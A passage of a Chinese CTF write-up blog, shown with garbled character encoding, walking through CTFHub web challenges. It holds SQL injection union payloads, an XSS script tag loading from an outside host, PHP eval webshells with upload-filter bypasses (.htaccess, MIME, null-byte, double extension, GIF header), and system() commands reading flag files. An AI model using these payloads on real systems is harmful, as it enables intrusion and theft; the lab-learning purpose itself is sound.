id="a-çˆ†åº“å"><a href="#a-çˆ†åº“å" class="headerlink" title="a.çˆ†åº“å"></a>a.çˆ†åº“å</h5><p>è¿™æ˜¯è·å–æ‰€æœ‰æ•°æ®åº“çš„è¯­å¥ï¼š</p><p>â€˜ union select 1,group_concat(schema_name) from information_schema.schemata â€“ â€˜</p><p>å‘ç°information_schemaæ˜¯ä¸€ä¸ªæ•°æ®åº“</p><p>â€˜ union select 1,database()#</p><p>å¾—åˆ°äº†sqli</p><h5 id="b-çˆ†è¡¨"><a href="#b-çˆ†è¡¨" class="headerlink" title="b.çˆ†è¡¨"></a>b.çˆ†è¡¨</h5><p>â€˜ union select table_schema, group_concat(table_name) from information_schema.tables where table_schema=â€™sqliâ€™ â€“ â€˜</p><h5 id="c-çˆ†åˆ—å-1"><a href="#c-çˆ†åˆ—å-1" class="headerlink" title="c.çˆ†åˆ—å"></a>c.çˆ†åˆ—å</h5><p>-1â€™ union select 1,group_concat(column_name) from information_schema.columns where table_name=â€™flagâ€™#</p><h5 id="d-çˆ†å­—æ®µ-1"><a href="#d-çˆ†å­—æ®µ-1" class="headerlink" title="d.çˆ†å­—æ®µ"></a>d.çˆ†å­—æ®µ</h5><p>â€˜ union select 1,group_concat(flag) from flag â€“ â€˜</p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="åå°„å‹"><a href="#åå°„å‹" class="headerlink" title="åå°„å‹"></a>åå°„å‹</h3><p>åˆ©ç”¨xss platformå¹³å°åˆ›å»ºä¸€ä¸ªxssåå°„å‹çš„è„šæœ¬</p><pre><code>&lt;/tExtArEa&gt;&#39;&quot;&gt;&lt;sCRiPt sRC=//xs.sb/wnbP&gt;&lt;/sCrIpT&gt;</code></pre><p>æ²¡ä»€ä¹ˆå¥½è®°çš„æ“ä½œå¾ˆç®€å•ç›´æ¥ä¸Šå¤§ä½¬çš„wp</p><p><a href="https://blog.csdn.net/weixin_43486981/article/details/107974878" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43486981/article/details/107974878</a></p><h2 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h2><h3 id="æ— éªŒè¯"><a href="#æ— éªŒè¯" class="headerlink" title="æ— éªŒè¯"></a>æ— éªŒè¯</h3><p>ä¸€å¥è¯ï¼Œä¸€æŠŠæ¢­</p><pre><code>&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8811%E6%97%A52238_4.png" alt></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8811%E6%97%A52238_5.png" alt></p><h3 id="å‰ç«¯éªŒè¯"><a href="#å‰ç«¯éªŒè¯" class="headerlink" title="å‰ç«¯éªŒè¯"></a>å‰ç«¯éªŒè¯</h3><p>ä¸æ— éªŒè¯çš„åŒºåˆ«åœ¨äºå¯¹äºä¸Šä¼ çš„æ–‡ä»¶æ ¼å¼çš„åç¼€æœ‰è§„å®š</p><p>æ‰€ä»¥ï¼šshell.php.png å®‰æ’åªè¦ä¿è¯èƒ½ä¼ ä¸Šå»å°±è¡Œäº†ï¼ŒåŒæ—¶æŠ“åŒ…å»æ‰.pngä¿è¯èšå‰‘å¯ä»¥è¯†åˆ«</p><p>ç„¶åé‡å¤ä¸€å¥è¯ï¼Œä¸€æŠŠæ¢­æ“ä½œå³å¯</p><h4 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h4><p>ä»‹ç»ï¼š</p><p>.htaccessæ–‡ä»¶(æˆ–è€…â€åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶â€ï¼‰æä¾›äº†é’ˆå¯¹ç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•ï¼Œ å³ï¼Œåœ¨ä¸€ä¸ªç‰¹å®šçš„æ–‡æ¡£ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæŒ‡ä»¤çš„æ–‡ä»¶ï¼Œ ä»¥ä½œç”¨äºæ­¤ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ã€‚ä½œä¸ºç”¨æˆ·ï¼Œæ‰€èƒ½ä½¿ç”¨çš„å‘½ä»¤å—åˆ°é™åˆ¶ã€‚</p><p>htaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸/é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ã€‚</p><p>ç®€å•æ¥è¯´ï¼Œå°±æ˜¯æˆ‘ä¸Šä¼ äº†ä¸€ä¸ª.htaccessæ–‡ä»¶åˆ°æœåŠ¡å™¨ï¼Œé‚£ä¹ˆæœåŠ¡å™¨ä¹‹åå°±ä¼šå°†ç‰¹å®šæ ¼å¼çš„æ–‡ä»¶ä»¥phpæ ¼å¼è§£æã€‚</p><p>ç†è§£ï¼š</p><p>çœ‹åˆ°è¿™ï¼Œæ˜ç™½äº†ï¼Œå°±å¥½æ¯”ä½ å³ä½¿ä¸Šä¼ çš„æ˜¯pngæ–‡ä»¶ï¼Œä½†æ˜¯é€šè¿‡htaccessæ–‡ä»¶çš„è§£æï¼Œä½ ä¾ç„¶æ˜¯phpæ–‡ä»¶</p><p>å¤§ä½¬çš„ä»£ç ï¼š</p><p>//æ–¹æ³•ä¸€ SetHandler application/x-httpd-php      //æ‰€æœ‰çš„æ–‡ä»¶å½“åšphpæ–‡ä»¶æ¥è§£æ </p><p>//æ–¹æ³•äºŒ AddType application/x-httpd-php .png    //.pngæ–‡ä»¶å½“ä½œphpæ–‡ä»¶è§£æ</p><p>ä¸Šä¼ é¡ºåºï¼š</p><p>å…ˆåˆ¶ä½œ.htaccesså†æ¥shell.pngï¼ˆæ¯•ç«Ÿè¿›è¡Œäº†å‰ç«¯éªŒè¯ï¼‰</p><p>1.AddType application/x-httpd-php .png</p><p>2.<?php @eval($_POST['666']);?>ä¸€å¥è¯ï¼Œä¸€æŠŠæ¢­</p><h4 id="MIMEç»•è¿‡"><a href="#MIMEç»•è¿‡" class="headerlink" title="MIMEç»•è¿‡"></a>MIMEç»•è¿‡</h4><p>å¼•å­ï¼š</p><p>MIME (Multipurpose Internet Mail Extensions) æ˜¯æè¿°æ¶ˆæ¯å†…å®¹ç±»å‹çš„å› ç‰¹ç½‘æ ‡å‡†ã€‚</p><p>MIME æ¶ˆæ¯èƒ½åŒ…å«æ–‡æœ¬ã€å›¾åƒã€éŸ³é¢‘ã€è§†é¢‘ä»¥åŠå…¶ä»–åº”ç”¨ç¨‹åºä¸“ç”¨çš„æ•°æ®ã€‚</p><p>æµè§ˆå™¨é€šå¸¸ä½¿ç”¨MIMEç±»å‹ï¼ˆè€Œä¸æ˜¯æ–‡ä»¶æ‰©å±•åï¼‰æ¥ç¡®å®šå¦‚ä½•å¤„ç†URLï¼Œå› æ­¤WebæœåŠ¡å™¨åœ¨å“åº”å¤´ä¸­æ·»åŠ æ­£ç¡®çš„MIMEç±»å‹éå¸¸é‡è¦ã€‚å¦‚æœé…ç½®ä¸æ­£ç¡®ï¼Œæµè§ˆå™¨å¯èƒ½ä¼šæ›²è§£æ–‡ä»¶å†…å®¹ï¼Œç½‘ç«™å°†æ— æ³•æ­£å¸¸å·¥ä½œï¼Œå¹¶ä¸”ä¸‹è½½çš„æ–‡ä»¶ä¹Ÿä¼šè¢«é”™è¯¯å¤„ç†ã€‚</p><p>é€šè¿‡ä»‹ç»å¯ä»¥çœ‹å‡ºæ¥ï¼Œè¿™ç§ç±»å‹çš„è¿‡æ»¤ä¸æ˜¯é’ˆå¯¹æ–‡ä»¶åç¼€åï¼Œè€Œæ˜¯æ ¹æ®httpå“åº”å¤´ä¿¡æ¯ï¼Œæ‰€ä»¥ä¸€å®šè¦é€šè¿‡æŠ“åŒ…è¿›è¡Œåˆ†æï¼š</p><p>å¦‚æœç›´æ¥ä¼ çš„è¯ä¼šå‡ºç°ä¸‹é¢ç»“æœï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8812%E6%97%A51052_1.png" alt></p><p>ä½†æ˜¯å¦‚æœå°†ï¼š</p><p>Content-Type: application/octet-stream</p><p>æ”¹ä¸ºï¼š</p><p>Content-Type: image/png</p><p>å°±ä¼šæ˜¾ç¤ºä¸Šä¼ æˆåŠŸ</p><p>ç„¶åä¸€å¥è¯ï¼Œä¸€æŠŠæ¢­</p><h5 id="00æˆªæ–­"><a href="#00æˆªæ–­" class="headerlink" title="00æˆªæ–­"></a>00æˆªæ–­</h5><p>å¼•å­:</p><p><strong>%00æˆªæ–­çš„ä¸¤ä¸ªæ¡ä»¶</strong></p><ul><li>php &lt; 5.3.4</li><li>magic_quotes_gpc = off</li></ul><p>æœ¨é©¬çš„æ–‡ä»¶æ ¼å¼ä¸ºï¼šphpwebshell.php%00.jpg</p><p>ä½†æ˜¯è¿™ä¸ªé¢˜éœ€è¦æˆªæ–­çš„åœ°æ–¹ä¸æ˜¯ä»æ–‡ä»¶çš„åç¼€è¿›è¡Œæˆªæ–­ï¼Œè€Œæ˜¯åœ¨å“åº”åä¿¡æ¯è¿›è¡Œä¿®æ”¹</p><p><strong>åˆ†ææºç ï¼š</strong></p><pre><code>if (!empty($_POST[&#39;submit&#39;])) {    $name = basename($_FILES[&#39;file&#39;][&#39;name&#39;]);    $info = pathinfo($name);    $ext = $info[&#39;extension&#39;];    $whitelist = array(&quot;jpg&quot;, &quot;png&quot;, &quot;gif&quot;);    if (in_array($ext, $whitelist)) {        $des = $_GET[&#39;road&#39;] . &quot;/&quot; . rand(10, 99) . date(&quot;YmdHis&quot;) . &quot;.&quot; . $ext;        if (move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $des)) {            echo &quot;&lt;script&gt;alert(&#39;ä¸Šä¼ æˆåŠŸ&#39;)&lt;/script&gt;&quot;;        } else {            echo &quot;&lt;script&gt;alert(&#39;ä¸Šä¼ å¤±è´¥&#39;)&lt;/script&gt;&quot;;        }    } else {        echo &quot;æ–‡ä»¶ç±»å‹ä¸åŒ¹é…&quot;;    }}</code></pre><p>$_FILES è§£é‡Šï¼ˆæ¬è‡ªphpæ‰‹å†Œï¼‰<br>$_FILES æ•°ç»„å†…å®¹å¦‚ä¸‹:</p><p>$_FILESã€â€˜myFileâ€™][â€˜nameâ€™] å®¢æˆ·ç«¯æ–‡ä»¶çš„åŸåç§°ã€‚</p><p>$_FILESã€â€˜myFileâ€™][â€˜typeâ€™] æ–‡ä»¶çš„ MIME ç±»å‹ï¼Œéœ€è¦æµè§ˆå™¨æä¾›è¯¥ä¿¡æ¯çš„æ”¯æŒï¼Œä¾‹å¦‚â€image/gifâ€ã€‚</p><p>$_FILESã€â€˜myFileâ€™][â€˜sizeâ€™] å·²ä¸Šä¼ æ–‡ä»¶çš„å¤§å°ï¼Œå•ä½ä¸ºå­—èŠ‚ã€‚</p><p>$_FILESã€â€˜myFileâ€™][â€˜tmp_nameâ€™] æ–‡ä»¶è¢«ä¸Šä¼ ååœ¨æœåŠ¡ç«¯å‚¨å­˜çš„ä¸´æ—¶æ–‡ä»¶åï¼Œä¸€èˆ¬æ˜¯ç³»ç»Ÿé»˜è®¤ã€‚å¯ä»¥åœ¨ php.ini çš„ upload_tmp_dir æŒ‡å®šï¼Œä½† ç”¨ putenv() å‡½æ•°è®¾ç½®æ˜¯ä¸èµ·ä½œç”¨çš„ã€‚</p><p>$_FILESã€â€˜myFileâ€™][â€˜errorâ€™] å’Œè¯¥æ–‡ä»¶ä¸Šä¼ ç›¸å…³çš„é”™è¯¯ä»£ç ã€‚[â€˜errorâ€™] æ˜¯åœ¨ PHP 4.2.0 ç‰ˆæœ¬ä¸­å¢åŠ çš„ã€‚ä¸‹é¢æ˜¯å®ƒçš„è¯´æ˜ï¼š(å®ƒä»¬åœ¨ PHP 4.3.0 ä¹‹åå˜æˆäº† PHP å¸¸é‡ã€‚)</p><p>basename() å‡½æ•°ï¼šè¿”å›è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†ã€‚<br>$_name æ˜¯ä¸Šä¼ çš„æ–‡ä»¶ååŠ åç¼€<br>$_ext å¾—åˆ°çš„å°±æ˜¯åç¼€å<br>é‡ç‚¹å°±åœ¨ $desè¿™ä¸ªå˜é‡<br>å¾—åˆ°çš„å®Œæ•´è·¯å¾„æ˜¯ GET[â€˜roadâ€™]+éšæœºæ•°+æ—¥æœŸåŠ å‰é¢è·å¾—çš„åç¼€åçœ‹åˆ°è¿™é‡ŒåŸºæœ¬å¯çœ‹å‡ºæ¥ï¼Œå¦‚æœç›´æ¥ä¸Šä¼ çš„è¯ï¼Œæ–‡ä»¶æ˜¯ä¼šè¢«é‡æ–°å‘½åçš„ï¼Œæ‰€ä»¥è¿™é‡Œå°±æœ‰ä¸€ä¸ªåŠæ³•å°±æ˜¯åœ¨</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8812%E6%97%A51239_3.png" alt></p><p>è¿™é‡Œä¸ºè‡ªå·±æ‹Ÿå®šä¸€ä¸ªæ–‡ä»¶åå­—ï¼Œå¹¶ä¸”ä½¿ç”¨00æˆªæ–­åé¢è‡ªåŠ¨ç”Ÿæˆçš„ä¿¡æ¯ï¼Œè¿™æ ·å°±å¯ä»¥é˜²æ­¢ä½ ä¸Šä¼ çš„æ–‡ä»¶è¢«è®¤å®šä¸ºä¸´æ—¶æ–‡ä»¶äº†</p><p>å¯ä»¥çœ‹åˆ°ä¹‹å‰ä¸Šä¼ çš„æ–‡ä»¶éƒ½æ˜¯è¢«è®¤å®šä¸ºä¸´æ—¶æ–‡ä»¶ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8812%E6%97%A51237_2.png" alt></p><p>æœ€åä¸Šä¼ çš„è·¯å¾„ä¸º/uoload/1.phpç„¶åä¸€å¥è¯ï¼Œä¸€æŠŠæ¢­</p><h5 id="åŒå†™åç¼€"><a href="#åŒå†™åç¼€" class="headerlink" title="åŒå†™åç¼€"></a>åŒå†™åç¼€</h5><p>ç›´æ¥ä¸åšä¿®æ”¹çš„ä¸Šä¼ å‘ç°ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8812%E6%97%A51248_4.png" alt></p><p>phpæ²¡äº†ï¼ï¼ï¼</p><p>æ‰€ä»¥è¿™é‡Œå…³äºç»•è¿‡ï¼Œè€Œä¸”æ˜æ˜¾å‘Šè¯‰æ˜¯åŒå†™ï¼Œé‚£å°±ï¼š</p><p>shell.pphphp</p><p>æˆåŠŸäº†ï¼Œä¸€æŠŠæ¢­ï¼ˆå…³äºæ€ä¹ˆç»•è¿‡è¦è‡ªå·±ä¸æ–­å°è¯•ï¼Œå³å¯ï¼‰</p><h4 id="æ–‡ä»¶å¤´æ£€æŸ¥"><a href="#æ–‡ä»¶å¤´æ£€æŸ¥" class="headerlink" title="æ–‡ä»¶å¤´æ£€æŸ¥"></a>æ–‡ä»¶å¤´æ£€æŸ¥</h4><p>éƒ½è¯´æ˜¯æ–‡ä»¶å¤´æ£€æŸ¥äº†ï¼Œé‚£è‚¯å®šå°±æ˜¯æŠ“åŒ…å•Š</p><p>å°†æ–‡ä»¶æ”¹ä¸ºè¿™ä¸ª</p><p>Content-Type: image/png</p><p>ä½†æ˜¯è¯´æˆ‘æ–‡ä»¶é”™è¯¯ï¼Œæ˜¯æ–‡ä»¶é”™è¯¯ï¼Œé‚£ä¹ˆå°±å‡†å¤‡æ”¹æ–‡ä»¶ï¼Œ</p><pre><code>GIF89a&lt;?php @eval($_POST[&#39;666&#39;]);?&gt;</code></pre><p>æŠŠéšä¾¿ä¸€ä¸ªå›¾ç‰‡ç”¨hexæ‰“å¼€å‘ç°ä»–å¤´éƒ¨ä¿¡æ¯å°±æ˜¯è¿™ä¸ªGIF89a</p><p>ç„¶åç»§ç»­ä¸Šä¼ å‡†å¤‡ä¸€æŠŠæ¢­</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8812%E6%97%A51301_5.png" alt></p><p>success</p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="evalæ‰§è¡Œ"><a href="#evalæ‰§è¡Œ" class="headerlink" title="evalæ‰§è¡Œ"></a>evalæ‰§è¡Œ</h3><p>é¢˜ç›®ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>eval():è¯¥å‡½æ•°å¯ä»¥æŠŠå­—ç¬¦ä¸²ä½œä¸ºPHPä»£ç æ‰§è¡Œ</li><li>$_REQUEST[â€™â€™]:å’ŒGETå’ŒPOSTç±»ä¼¼ï¼Œä¸è¿‡ååº”é€Ÿåº¦æ¯”è¾ƒæ…¢</li></ul><p>å¤§ä½“æ„æ€æ˜¯ï¼šåˆ¤æ–­cmdæ˜¯å¦è¢«è®¾ç½®ï¼Œè‹¥cmdè¢«èµ‹å€¼ï¼Œåˆ™æ‰§è¡Œå¦‚ä¸‹è¯­å¥ï¼Œå¦åˆ™å°±ç»§ç»­æ˜¾ç¤ºä»¥ä¸Šä»£ç ã€‚<br>æ–¹æ³•ä¸€ï¼š</p><p>eval($_REQUEST[â€œcmdâ€]);</p><p>é€šè¿‡èšå‰‘ç›´æ¥è¿æ¥ï¼Œå¯†ç cmd</p><p>æ–¹æ³•äºŒï¼š</p><p>æ„é€ URLï¼š?cmd=system(â€œlsâ€);</p><p>å‘ç°äº†index.php</p><p>ç»§ç»­æ„é€ ?cmd=system(â€œcd /;lsâ€);</p><p>å¾—åˆ°ï¼šbin boot dev etc flag_30765 home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</p><p>æ„é€ ï¼š</p><p>?cmd=system(â€œcd /;cat flag_30765â€);</p><p>success</p><h3 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// å…³é—­é”™è¯¯æŠ¥å‘Š</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//strpos â€” æŸ¥æ‰¾å­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½®</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"Hacker!!!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‡½æ•°è§£é‡Šï¼š</p><pre><code>#å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰ strpos(&quot;You love php, I love php too!&quot;,&quot;php&quot;);</code></pre><p>å‘ç°ä¸€ä¸ªshell</p><pre><code>&lt;?php eval($_REQUEST[&#39;ctfhub&#39;]);?&gt;é¢„å®šä¹‰çš„ $_REQUEST å˜é‡åŒ…å«äº† $_GETã€$_POST å’Œ $_COOKIE çš„å†…å®¹$_REQUEST å˜é‡å¯ç”¨æ¥æ”¶é›†é€šè¿‡ GET å’Œ POST æ–¹æ³•å‘é€çš„è¡¨å•æ•°æ®$_REQUEST å˜é‡æ—¢å¯ä»¥æ”¶é›†GETæ–¹æ³•å‘é€çš„æ•°æ®ï¼Œä¹Ÿå¯ä»¥æ¥å—POSTæ–¹æ³•æ¥å—çš„æ•°æ®</code></pre><p>ç›´æ¥èšå‰‘å§ï¼Œå‘ç°æ˜¯txtæ–‡ä»¶ï¼Œæ²¡åŠæ³•è¿æ¥</p><p>å› ä¸ºé¢˜ç›®ç»™å‡ºï¼š</p><p>i have a <a href="shell.txt">shell</a>, how to use it ?</p><p>æ‰€ä»¥æ„é€ å‚æ•°ï¼š</p><p><a href="http://challenge-799c3c5c6ecef465.sandbox.ctfhub.com:10080/?file=shell.txt" target="_blank" rel="noopener">http://challenge-799c3c5c6ecef465.sandbox.ctfhub.com:10080/?file=shell.txt</a></p><p>ç„¶åä½¿ç”¨hackbarçš„postdataä¼ å‚</p><p>ctfhub=system(â€˜lsâ€™);</p><p>ctfhub=system(â€˜ls /â€˜);</p><p>ctfhub=system(â€˜cat /flagâ€™);</p><p>å¾—åˆ°flag</p><h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><p>é¢˜å‹ï¼šphpä¼ªåè®®</p><pre><code>php://inputç‰¹ç‚¹å¦‚ä¸‹:1ï¼‰ã€Coentent-Typeä»…åœ¨å–å€¼ä¸ºapplication/x-www-data-urlencodedå’Œmultipart/form-dataä¸¤ç§æƒ…å†µä¸‹ï¼ŒPHPæ‰ä¼šå°†httpè¯·æ±‚æ•°æ®åŒ…ä¸­ç›¸åº”çš„æ•°æ®å¡«å…¥å…¨å±€å˜é‡$_POST2ï¼‰ã€PHPä¸èƒ½è¯†åˆ«çš„Content-Typeç±»å‹çš„æ—¶å€™ï¼Œä¼šå°†httpè¯·æ±‚åŒ…ä¸­ç›¸åº”çš„æ•°æ®å¡«å…¥å˜é‡$HTTP_RAW_POST_DATA3ï¼‰ã€åªæœ‰Coentent-Typeä¸ºmultipart/form-dataçš„æ—¶å€™ï¼ŒPHPä¸ä¼šå°†httpè¯·æ±‚æ•°æ®åŒ…ä¸­çš„ç›¸åº”æ•°æ®å¡«å…¥php://inputï¼Œå¦åˆ™å…¶å®ƒæƒ…å†µéƒ½ä¼šã€‚å¡«å…¥çš„é•¿åº¦ï¼Œç”±Coentent-LengthæŒ‡å®šã€‚4ï¼‰ã€åªæœ‰Content-Typeä¸ºapplication/x-www-data-urlencodedæ—¶ï¼Œphp://inputæ•°æ®æ‰è·Ÿ$_POSTæ•°æ®ç›¸ä¸€è‡´ã€‚5ï¼‰ã€php://inputæ•°æ®æ€»æ˜¯è·Ÿ$HTTP_RAW_POST_DATAç›¸åŒï¼Œä½†æ˜¯php://inputæ¯”$HTTP_RAW_POST_DATAæ›´å‡‘æ•ˆï¼Œä¸”ä¸éœ€è¦ç‰¹æ®Šè®¾ç½®php.ini6ï¼‰ã€PHPä¼šå°†PATHå­—æ®µçš„query_pathéƒ¨åˆ†ï¼Œå¡«å…¥å…¨å±€å˜é‡$_GETã€‚é€šå¸¸æƒ…å†µä¸‹ï¼ŒGETæ–¹æ³•æäº¤çš„httpè¯·æ±‚ï¼Œbodyä¸ºç©ºã€‚æ€»ç»“èµ·æ¥å°±æ˜¯ï¼Œåœ¨ç”¨$_POSTè·å–ä¸åˆ°ç”±APPæˆ–è€…ä¸€äº›æ¥å£çš„å›è°ƒæ•°æ®æ—¶,å°±ç”¨php://inputè¯•è¯•</code></pre><p>é¢˜ç›®ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">===</span> "php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//" ) {</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"Hacker!!!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span></span>i don't have shell<span class="token punctuation">,</span> how to get flag<span class="token operator">?</span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>phpinfo.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>phpinfo<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>i don't have shell<span class="token punctuation">,</span> how to get flag<span class="token operator">?</span> phpinfo<span aria-hidden="true" 